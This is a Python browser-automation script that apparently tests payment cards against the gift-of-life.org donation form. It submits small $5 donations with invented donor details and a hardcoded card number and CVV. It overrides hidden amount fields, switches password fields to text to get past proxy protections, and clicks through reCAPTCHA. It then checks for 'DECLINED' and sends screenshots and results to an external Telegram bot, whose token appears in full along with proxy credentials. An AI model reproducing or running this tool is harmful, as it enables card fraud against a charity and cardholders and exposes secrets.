#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Gift of Life Donation v12 — password-safe + amount via hidden fields
"""

import os
import time
import json
import requests
import traceback

try:
    from playwright.sync_api import sync_playwright
except ImportError:
    os.system("pip install playwright")
    os.system("playwright install chromium")
    from playwright.sync_api import sync_playwright

# ═══════════════════════════════════════════════════
BOT_TOKEN = "8647240736:AAEGXuwmtZkUvAfbURX2BcyyuoWD-TekP_0"
CHAT_ID = 6843321125

BD_HOST = "brd.superproxy.io"
BD_PORT = "9222"
BD_USER = "brd-customer-hl_24c8058e-zone-scraping_browser1"
BD_PASS = "eyr0v46j28pi"

TARGET_URL = "https://gift-of-life.org/make-a-donation/"

FIRST_NAME = "Wafa"
LAST_NAME = "Bro"
EMAIL = "wafabro980@gmail.com"
PHONE = "2019679866"
ADDRESS_1 = "W356"
ADDRESS_2 = "Apt 12"
CITY = "Carifnia"
STATE_VALUE = "1305"
ZIP = "90011"

CARD_NUMBER = "5178057879094972"
CARD_NAME = "Wafa Bro"
CARD_MONTH = "08"
CARD_YEAR = "2030"
CARD_CVV = "123"
CARD_TYPE = "MasterCard"

DONATION_AMOUNT = "5"

P = "_ArrevaOnlineDonationsPortlet_WAR_ArrevaOnlineDonationsPortlet_:form1:"


def sid(name):
    return f'[id="{P}{name}"]'


def tg_msg(text):
    try:
        requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            data={"chat_id": CHAT_ID, "text": text[:4000], "parse_mode": "HTML"},
            timeout=15
        )
    except Exception as e:
        print(f"TG msg error: {e}", flush=True)


def tg_photo(path, caption=""):
    try:
        with open(path, "rb") as f:
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
                data={"chat_id": CHAT_ID, "caption": caption[:1000]},
                files={"photo": f},
                timeout=30
            )
    except Exception as e:
        print(f"TG photo error: {e}", flush=True)


def dump_frames(page, label="FRAMES"):
    try:
        info = []
        for i, f in enumerate(page.frames):
            try:
                info.append(f"#{i} name='{f.name or ''}' url='{(f.url or '')[:80]}'")
            except Exception:
                info.append(f"#{i} (unreadable)")
        tg_msg(f"📋 {label} ({len(info)}):\n" + "\n".join(info))
    except Exception as e:
        tg_msg(f"⚠️ dump_frames: {e}")


def find_donation_frame(page, total_seconds=120):
    start = time.time()
    attempt = 0
    while time.time() - start < total_seconds:
        attempt += 1
        for f in page.frames:
            try:
                if f.locator('[id*="datafirst"]').first.count() > 0:
                    tg_msg(f"✅ Found form in frame name='{f.name}'")
                    return f, attempt
            except Exception:
                pass
        if attempt % 10 == 0:
            dump_frames(page, f"Attempt {attempt}")
        time.sleep(2)
    return None, attempt


def check_reject_in_text(text):
    for line in text.split("\n"):
        l = line.strip()
        if "REJECT" in l.upper() or "DECLINED" in l.upper():
            return l
    return None


# ═══════════════════════════════════════════════════
#  FILL (text + password-safe)
# ═══════════════════════════════════════════════════

def fill_text_field(frame, field_suffix, value, label=""):
    """ملء حقل نصي عادي"""
    try:
        el = frame.locator(sid(field_suffix)).first
        el.wait_for(state="visible", timeout=10000)
        el.fill(str(value), timeout=5000)
        el.evaluate("el => el.dispatchEvent(new Event('input',{bubbles:true}))")
        actual = frame.evaluate(
            "(id) => { const el = document.getElementById(id); return el ? el.value : null; }",
            f"{P}{field_suffix}"
        )
        ok = (actual == str(value))
        tg_msg(f"{'✅' if ok else '⚠️'} {label or field_suffix}: '{actual}'")
        return ok
    except Exception as e:
        tg_msg(f"❌ {label or field_suffix}: {str(e)[:150]}")
        return False


def fill_password_field(frame, field_suffix, value, label=""):
    """
    يتجاوز حماية BrightData على حقول password
    بتغيير type لـ text ثم الكتابة ثم إرجاعه
    """
    tg_msg(f"🔄 Password-safe fill: {label or field_suffix}")

    try:
        # 1. غيّر type لـ text
        changed = frame.evaluate(
            """(id) => {
                const el = document.getElementById(id);
                if (!el) return false;
                el.setAttribute('data-orig-type', el.type);
                el.type = 'text';
                return true;
            }""",
            f"{P}{field_suffix}"
        )
        if not changed:
            tg_msg(f"❌ {label}: element not found")
            return False
        tg_msg(f"✅ {label}: type password→text")

        # 2. fill عادي (type=text)
        el = frame.locator(sid(field_suffix)).first
        el.fill(str(value), timeout=5000)

        # 3. تحقق
        actual = frame.evaluate(
            "(id) => { const el = document.getElementById(id); return el ? el.value : null; }",
            f"{P}{field_suffix}"
        )
        tg_msg(f"{'✅' if actual == str(value) else '⚠️'} {label}: filled='{actual}'")

        # 4. رجّع type لـ password
        frame.evaluate(
            """(id) => {
                const el = document.getElementById(id);
                if (!el) return false;
                const orig = el.getAttribute('data-orig-type') || 'password';
                el.type = orig;
                el.removeAttribute('data-orig-type');
                return true;
            }""",
            f"{P}{field_suffix}"
        )
        tg_msg(f"✅ {label}: type restored")
        return actual == str(value)
    except Exception as e:
        tg_msg(f"❌ {label}: {str(e)[:150]}")
        return False


def select_option_safe(frame, field_suffix, value, label=""):
    """select option آمن مع change event"""
    try:
        ok = frame.evaluate(
            """([id, val]) => {
                const el = document.getElementById(id);
                if (!el) return false;
                el.value = val;
                el.dispatchEvent(new Event('change', {bubbles: true}));
                return true;
            }""",
            [f"{P}{field_suffix}", value]
        )
        tg_msg(f"{'✅' if ok else '❌'} {label or field_suffix}: '{value}'")
        return ok
    except Exception as e:
        tg_msg(f"❌ {label or field_suffix}: {str(e)[:150]}")
        return False


# ═══════════════════════════════════════════════════
#  AMOUNT — تحديث الحقول المخفية مباشرة
# ═══════════════════════════════════════════════════

def set_amount_js_direct(frame, amount):
    tg_msg(f"🔄 Setting amount = {amount} (direct JS on hidden fields)")

    # 1. Other radio
    try:
        frame.evaluate(
            f"""() => {{
                const rb = document.getElementById('{P}rb_amount:4');
                if (rb) {{
                    rb.checked = true;
                    rb.dispatchEvent(new Event('change', {{bubbles: true}}));
                }}
            }}"""
        )
        tg_msg("✅ Other radio checked via JS")
    except Exception as e:
        tg_msg(f"⚠️ Other radio: {str(e)[:120]}")

    time.sleep(2)

    # 2. other_amount
    try:
        ok = frame.evaluate(
            """(amt) => {
                const el = document.querySelector('input[id*="other_amount"]');
                if (!el) return false;
                el.value = amt;
                el.dispatchEvent(new Event('input', {bubbles: true}));
                el.dispatchEvent(new Event('change', {bubbles: true}));
                return true;
            }""",
            str(amount)
        )
        tg_msg(f"{'✅' if ok else '❌'} other_amount set")
    except Exception as e:
        tg_msg(f"❌ other_amount: {str(e)[:120]}")

    time.sleep(2)

    # 3. الحقول المخفية
    try:
        result = frame.evaluate(
            """(amt) => {
                const P = '""" + P + """';
                const fee = parseFloat(document.getElementById(P + 'fee_amount').value) || 0;
                const total = parseFloat(amt) + fee;

                const atp = document.getElementById(P + 'amount_to_pay');
                if (atp) atp.value = total.toFixed(2);

                const lt = document.getElementById('label_total_amount');
                if (lt) lt.value = '$ ' + total.toFixed(2);

                const lth = document.getElementById(P + 'label_total_hidden_amount');
                if (lth) lth.value = '$ ' + total.toFixed(2);

                const lp = document.getElementById(P + 'label_payment_amount');
                if (lp) lp.value = '$ ' + total.toFixed(2);

                const oao = document.getElementById(P + 'other_amount_on');
                if (oao) oao.value = 'true';

                return {
                    amount_to_pay: atp ? atp.value : null,
                    label_total: lt ? lt.value : null,
                    label_payment: lp ? lp.value : null,
                };
            }""",
            str(amount)
        )
        tg_msg(f"✅ hidden updated: {json.dumps(result, ensure_ascii=False)}")
    except Exception as e:
        tg_msg(f"❌ hidden update: {str(e)[:150]}")

    time.sleep(1)

    # 4. تحقق نهائي
    try:
        check = frame.evaluate(
            """() => {
                const P = '""" + P + """';
                return {
                    other: document.querySelector('input[id*="other_amount"]')?.value,
                    total_label: document.getElementById('label_total_amount')?.value,
                    amount_to_pay: document.getElementById(P + 'amount_to_pay')?.value,
                    payment_amount: document.getElementById(P + 'label_payment_amount')?.value,
                };
            }"""
        )
        tg_msg(f"📋 Final amount: {json.dumps(check, ensure_ascii=False)}")
        return True
    except Exception:
        return False


# ═══════════════════════════════════════════════════
#  CAPTCHA
# ═══════════════════════════════════════════════════

def solve_captcha_once(frame, page):
    tg_msg("🔄 [7] reCAPTCHA — single attempt")
    try:
        token = frame.evaluate("""() => {
            const ta = document.querySelector('textarea[name="g-recaptcha-response"]');
            return ta ? ta.value : '';
        }""")
        tg_msg(f"📌 Current token len = {len(token) if token else 0}")
        if token and len(token) > 20:
            tg_msg("✅ reCAPTCHA already solved")
            return True
    except Exception:
        pass

    try:
        for f in page.frames:
            try:
                if "recaptcha/api2/anchor" in (f.url or ""):
                    cb = f.locator("#recaptcha-anchor").first
                    cb.wait_for(state="attached", timeout=8000)
                    cb.click(force=True, timeout=5000)
                    tg_msg("✅ Clicked reCAPTCHA checkbox")
                    break
            except Exception:
                continue

        for i in range(25):
            try:
                token = frame.evaluate("""() => {
                    const ta = document.querySelector('textarea[name="g-recaptcha-response"]');
                    return ta ? ta.value : '';
                }""")
                if token and len(token) > 20:
                    tg_msg(f"✅ reCAPTCHA solved! len={len(token)}")
                    return True
            except Exception:
                pass
            time.sleep(1)
        tg_msg("⚠️ reCAPTCHA still empty")
        return False
    except Exception as e:
        tg_msg(f"⚠️ reCAPTCHA: {str(e)[:150]}")
        return False


# ═══════════════════════════════════════════════════
#  MAIN
# ═══════════════════════════════════════════════════

def run():
    tg_msg("🚀 Gift of Life Donation v12 — Start")

    cdp_url = f"wss://{BD_USER}:{BD_PASS}@{BD_HOST}:{BD_PORT}"

    try:
        pw = sync_playwright().start()
        browser = pw.chromium.connect_over_cdp(cdp_url, timeout=120000)
        tg_msg("✅ Connected")
    except Exception as e:
        tg_msg(f"❌ Connect: {str(e)[:200]}")
        return

    context = browser.new_context(
        viewport={"width": 1366, "height": 900},
        user_agent=("Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 "
                    "(KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36"),
        locale="en-US",
    )
    page = context.new_page()
    page.set_default_timeout(60000)

    # 1. فتح
    tg_msg("🔄 [1] Opening page...")
    try:
        page.goto(TARGET_URL, wait_until="domcontentloaded", timeout=60000)
        time.sleep(10)
    except Exception as e:
        tg_msg(f"❌ Load: {str(e)[:200]}")
        return
    tg_msg("✅ Page loaded")

    # 2. iframe
    tg_msg("🔄 [2] Searching for form fields...")
    frame, attempts = find_donation_frame(page, 120)
    if not frame:
        tg_msg("❌ no frame — reload")
        try:
            page.reload(wait_until="domcontentloaded", timeout=60000)
            time.sleep(15)
        except Exception:
            pass
        frame, attempts = find_donation_frame(page, 90)
    if not frame:
        tg_msg("❌ not found")
        return
    tg_msg(f"✅ using frame name='{frame.name}' attempts={attempts}")
    time.sleep(5)

    # 3. المبلغ
    tg_msg("🔄 [3] Setting amount...")
    set_amount_js_direct(frame, DONATION_AMOUNT)

    # 4. بيانات المتبرع
    tg_msg("🔄 [4] Filling donor info...")
    fill_text_field(frame, "datafirst", FIRST_NAME, "First name")
    fill_text_field(frame, "datalast", LAST_NAME, "Last name")
    fill_text_field(frame, "email", EMAIL, "Email")
    fill_text_field(frame, "data_phone", PHONE, "Phone")
    fill_text_field(frame, "data_address_one", ADDRESS_1, "Address")
    fill_text_field(frame, "data_address_two", ADDRESS_2, "Apt/Suite")
    fill_text_field(frame, "data_address_city", CITY, "City")
    fill_text_field(frame, "data_address_zip", ZIP, "Zip")

    # Country
    try:
        us_value = frame.evaluate(f"""() => {{
            const sel = document.querySelector('select[id="{P}data_Rcountry"]');
            if (!sel) return null;
            for (const o of sel.options) {{
                const t = o.text.trim().toLowerCase();
                if (t === 'united states' || t === 'usa' || t === 'us') return o.value;
            }}
            return null;
        }}""")
        if us_value:
            select_option_safe(frame, "data_Rcountry", us_value, f"Country (US={us_value})")
    except Exception as e:
        tg_msg(f"⚠️ Country: {str(e)[:150]}")

    select_option_safe(frame, "data_Rstate", STATE_VALUE, "State (CA)")

    # 5. البطاقة
    tg_msg("🔄 [5] Filling card info (password-safe)...")
    time.sleep(1)

    fill_text_field(frame, "nameOnCard", CARD_NAME, "Card name")
    fill_password_field(frame, "cardNumber", CARD_NUMBER, "Card number")
    fill_password_field(frame, "cardCSV", CARD_CVV, "CVV")

    select_option_safe(frame, "cardType", CARD_TYPE, "Card type")
    select_option_safe(frame, "expiration_date_month", CARD_MONTH, "Exp month")
    select_option_safe(frame, "expiration_date_year", CARD_YEAR, "Exp year")

    # 6. screenshot
    try:
        page.screenshot(path="/tmp/before_captcha.png", full_page=True)
        tg_photo("/tmp/before_captcha.png", "📸 Before captcha")
    except Exception:
        pass

    # 7. reCAPTCHA
    captcha_ok = solve_captcha_once(frame, page)

    # 8. Pre-submit
    tg_msg("🔄 [8] Verifying...")
    try:
        vals = frame.evaluate(f"""() => {{
            const g = (n) => {{
                const el = document.getElementById('{P}' + n);
                return el ? el.value : null;
            }};
            const oa = document.querySelector('input[id*="other_amount"]');
            const lt = document.getElementById('label_total_amount');
            const atp = document.getElementById('{P}amount_to_pay');
            const lp = document.getElementById('{P}label_payment_amount');
            return {{
                first: g('datafirst'),
                last: g('datalast'),
                email: g('email'),
                phone: g('data_phone'),
                addr1: g('data_address_one'),
                addr2: g('data_address_two'),
                city: g('data_address_city'),
                zip: g('data_address_zip'),
                state: g('data_Rstate'),
                country: g('data_Rcountry'),
                card_name: g('nameOnCard'),
                card_num_len: (g('cardNumber') || '').length,
                cvv_len: (g('cardCSV') || '').length,
                exp_month: g('expiration_date_month'),
                exp_year: g('expiration_date_year'),
                card_type: g('cardType'),
                other_amount: oa ? oa.value : null,
                total_label: lt ? lt.value : null,
                amount_to_pay: atp ? atp.value : null,
                payment_amount: lp ? lp.value : null,
                recaptcha_len: (g('g-recaptcha-response') || '').length,
            }};
        }}""")
        tg_msg(f"📋 Pre-submit:\n<pre>{json.dumps(vals, indent=1, ensure_ascii=False)}</pre>")
    except Exception as e:
        tg_msg(f"⚠️ Verify: {str(e)[:150]}")

    if not captcha_ok:
        tg_msg("⛔ captcha not solved")

    # 9. Submit
    tg_msg("🔄 [9] Clicking Submit...")
    try:
        btn = frame.locator(sid("j_idt1913")).first
        btn.wait_for(state="visible", timeout=10000)
        btn.click(timeout=5000)
        tg_msg("✅ Submit clicked")
    except Exception as e:
        tg_msg(f"⚠️ Submit: {str(e)[:150]}")
        try:
            frame.evaluate(f"""() => {{
                const btn = document.getElementById('{P}j_idt1913');
                if (btn) btn.click();
            }}""")
            tg_msg("✅ JS click")
        except Exception:
            pass

    time.sleep(10)

    # 10. النتيجة
    tg_msg("🔄 [10] Reading result...")
    time.sleep(10)

    try:
        page.screenshot(path="/tmp/result.png", full_page=True)
        tg_photo("/tmp/result.png", "📸 Result")
    except Exception:
        pass

    final_result = None
    try:
        iframe_text = frame.evaluate("() => document.body.innerText")
        r = check_reject_in_text(iframe_text)
        if r:
            final_result = r
            tg_msg(f"⛔ SERVER REJECT: {r}")
    except Exception:
        pass

    if not final_result:
        try:
            main_text = page.evaluate("document.body.innerText")
            r = check_reject_in_text(main_text)
            if r:
                final_result = r
                tg_msg(f"⛔ SERVER REJECT (main): {r}")
        except Exception:
            pass

    try:
        iframe_text = frame.evaluate("() => document.body.innerText")
        lines = []
        for line in iframe_text.split("\n"):
            l = line.strip()
            if any(k in l.lower() for k in ["success","approved","declin","error","invalid",
                                             "thank","confirm","failed","reject","captcha",
                                             "verified","otp","verification","limit","enter"]):
                lines.append(l)
        if lines:
            tg_msg("📊 Result:\n" + "\n".join(lines[:25]))
        else:
            tg_msg("⚠️ no keywords. iframe preview:\n<pre>" + iframe_text[:1500] + "</pre>")
    except Exception as e:
        tg_msg(f"⚠️ read: {str(e)[:150]}")

    if final_result:
        tg_msg(f"🏁 FINAL RESULT: {final_result}")
    else:
        tg_msg("🏁 FINAL RESULT: unknown")

    tg_msg("✅ DONE")

    try: context.close()
    except: pass
    try: browser.close()
    except: pass
    try: pw.stop()
    except: pass


if __name__ == "__main__":
    try:
        run()
    except Exception as e:
        tg_msg(f"❌ FATAL:\n{traceback.format_exc()[:3500]}")
